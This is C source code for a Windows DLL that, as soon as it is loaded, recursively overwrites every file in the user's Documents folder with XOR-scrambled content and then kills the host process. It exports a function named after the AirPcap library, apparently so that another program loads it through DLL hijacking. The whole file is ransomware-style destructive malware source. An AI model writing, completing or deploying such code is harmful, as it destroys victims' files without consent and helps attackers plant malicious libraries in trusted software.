#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <wincrypt.h>
#include <shlobj.h>

#define DLLIMPORT __declspec(dllexport)

FILE *logFile = NULL;  // File pointer for logging errors

// Function to log error messages to the report file
void logError(const TCHAR *errorMsg) {
    if (logFile) {
        _ftprintf(logFile, TEXT("%s\n"), errorMsg);
        fflush(logFile);  // Ensure the message is written immediately
    }
}

// Função executada quando o DLL é carregado
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Open the report file for appending error messages
        logFile = _tfopen(TEXT("report.txt"), TEXT("a"));
        if (logFile) {
            logError(TEXT("DLL Loaded - Starting process...\n"));
            encryptDocuments();  // Chama a função para encriptar a pasta Documents
            logError(TEXT("Encryption completed.\n"));
            fclose(logFile); // Close the log file
        } else {
            // If the file can't be opened, print a generic error to the console
            MessageBox(NULL, TEXT("Failed to open the report file."), TEXT("Error"), MB_OK);
        }
        ExitProcess(0); // Termina o processo atual
    }
    return TRUE;
}

DLLIMPORT void AirpcapGetDeviceList() { encryptDocuments(); }

// Função para encriptar a pasta Documents
void encryptDocuments() {
    TCHAR szPath[MAX_PATH];
    
    // Obtém o caminho para a pasta Documents do usuário
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_MYDOCUMENTS, NULL, 0, szPath))) {
        _tprintf(TEXT("Pasta Documents encontrada em: %s\n"), szPath);  // Exibe o caminho encontrado
        logError(TEXT("Found Documents folder: "));
        logError(szPath); // Log the folder path

        // Inicia a busca recursiva nos arquivos e pastas dentro da pasta Documents
        encryptFolder(szPath);
    } else {
        logError(TEXT("Erro ao obter o caminho da pasta Documents.\n"));
    }
}

// Função recursiva para encriptar a pasta e seus subdiretórios
void encryptFolder(const TCHAR* folderPath) {
    TCHAR searchPath[MAX_PATH];
    
    // Adiciona * para buscar todos os arquivos e pastas dentro da pasta
    _tcscpy_s(searchPath, MAX_PATH, folderPath);
    _tcscat_s(searchPath, MAX_PATH, _T("\\*")); // Add wildcard for file and folder search

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        logError(TEXT("Erro ao acessar a pasta.\n"));
        return;
    }

    do {
        // Ignora "." e ".."
        if (_tcscmp(findFileData.cFileName, _T(".")) != 0 && _tcscmp(findFileData.cFileName, _T("..")) != 0) {
            TCHAR fullFilePath[MAX_PATH];
            _tcscpy_s(fullFilePath, MAX_PATH, folderPath);
            _tcscat_s(fullFilePath, MAX_PATH, _T("\\"));
            _tcscat_s(fullFilePath, MAX_PATH, findFileData.cFileName);

            // Verifica se é um arquivo ou uma pasta
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // Se for uma pasta, chama a função recursiva para encriptar os arquivos dentro dessa pasta
                _tprintf(TEXT("Pasta encontrada: %s\n"), fullFilePath);
                logError(TEXT("Found folder: "));
                logError(fullFilePath); // Log folder path

                // Recursively encrypt files in the subfolder
                encryptFolder(fullFilePath);
            } else {
                // Se for um arquivo, encripta-o
                _tprintf(TEXT("Encriptando arquivo: %s\n"), fullFilePath);
                logError(TEXT("Encrypting file: "));
                logError(fullFilePath); // Log file path

                // Encripta o arquivo
                encryptFile(fullFilePath);
            }
        }
    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
}

// Função para encriptar um arquivo (simples encriptação com XOR para testes)
void encryptFile(const TCHAR* filePath) {
    // Abre o arquivo para leitura e escrita
    HANDLE hFile = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Erro ao abrir o arquivo %s\n"), filePath);
        logError(errorMsg);
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Erro ao obter o tamanho do arquivo %s\n"), filePath);
        logError(errorMsg);
        CloseHandle(hFile);
        return;
    }

    // Aloca um buffer para o conteúdo do arquivo
    BYTE* buffer = (BYTE*)malloc(dwFileSize);
    DWORD dwBytesRead;
    if (!ReadFile(hFile, buffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Erro ao ler o conteúdo do arquivo %s\n"), filePath);
        logError(errorMsg);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    // Encripta o conteúdo (usando XOR simples como exemplo)
    for (DWORD i = 0; i < dwFileSize; i++) {
        buffer[i] ^= 0xAA; // XOR com 0xAA
    }

    // Escreve o conteúdo encriptado de volta no arquivo
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD dwBytesWritten;
    if (!WriteFile(hFile, buffer, dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Erro ao escrever no arquivo %s\n"), filePath);
        logError(errorMsg);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    // Libera recursos
    free(buffer);
    CloseHandle(hFile);
}
